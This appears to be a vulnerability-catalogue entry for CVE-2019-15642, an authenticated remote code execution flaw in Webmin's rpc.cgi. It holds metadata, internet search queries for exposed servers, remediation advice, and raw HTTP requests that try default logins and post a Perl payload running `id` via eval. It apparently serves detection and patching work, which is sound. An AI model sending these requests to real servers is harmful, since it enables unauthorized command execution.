---
layout: post
cve_id: CVE-2019-15642
title: Webmin < 1.920 - Authenticated Remote Code Execution
pcap: true
pcap_path: /pcaps/2019/CVE-2019-15642.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-15642.yaml
snort2_rule: N/A
snort3_rule: N/A
author: pussycat0x
severity: high
impact: 'Successful exploitation of this vulnerability allows an authenticated attacker
  to execute arbitrary code on the target system.

  '
remediation: 'Upgrade Webmin to version 1.920 or later to mitigate this vulnerability.

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2019-15642
- https://github.com/jas502n/CVE-2019-15642
- https://doxfer.webmin.com/Webmin/Webmin_Servers_Index
- https://github.com/webmin/webmin/blob/ab5e00e41ea1ecc1e24b8f8693f3495a0abb1aed/rpc.cgi#L26-L37
- https://github.com/webmin/webmin/commit/df8a43fb4bdc9c858874f72773bcba597ae9432c
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.8
  cve-id: CVE-2019-15642
  cwe-id: CWE-94
  epss-score: 0.92499
  epss-percentile: 0.99719
  cpe: cpe:2.3:a:webmin:webmin:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 4
  vendor: webmin
  product: webmin
  shodan-query:
  - title:"Webmin"
  - http.title:"webmin"
  fofa-query: title="webmin"
  google-query: intitle:"webmin"
tags:
- cve
- cve2019
- webmin
- rce
- vkev
- vuln
---

## ðŸ” Vulnerability Description
rpc.cgi in Webmin through 1.920 allows authenticated Remote Code Execution via a crafted object name because unserialise_variable makes an eval call. NOTE: the Webmin_Servers_Index documentation states "RPC can be used to run any command or modify any file on a server, which is why access to it must not be granted to un-trusted Webmin users."


## ðŸŒ HTTP Request
```nohighlight
POST /session_login.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Content-Length: 21
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Cookie: redirect=1; testing=1
Origin: /
Referer: /
Connection: close
user=admin&pass=admin
```

```nohighlight
POST /rpc.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Content-Length: 78
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: //sysinfo.cgi?xnavigation=1
Connection: close
OBJECT Socket;print "Content-Type: text/plain\n\n";$cmd=`id`;print "$cmd\n\n";
```

```nohighlight
POST /rpc.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2
Content-Length: 78
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: //sysinfo.cgi?xnavigation=1
Connection: close
OBJECT Socket;print "Content-Type: text/plain\n\n";$cmd=`id`;print "$cmd\n\n";
```

```nohighlight
POST /session_login.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.4.8 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.8
Content-Length: 19
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Cookie: redirect=1; testing=1
Origin: /
Referer: /
Connection: close
user=root&pass=root
```

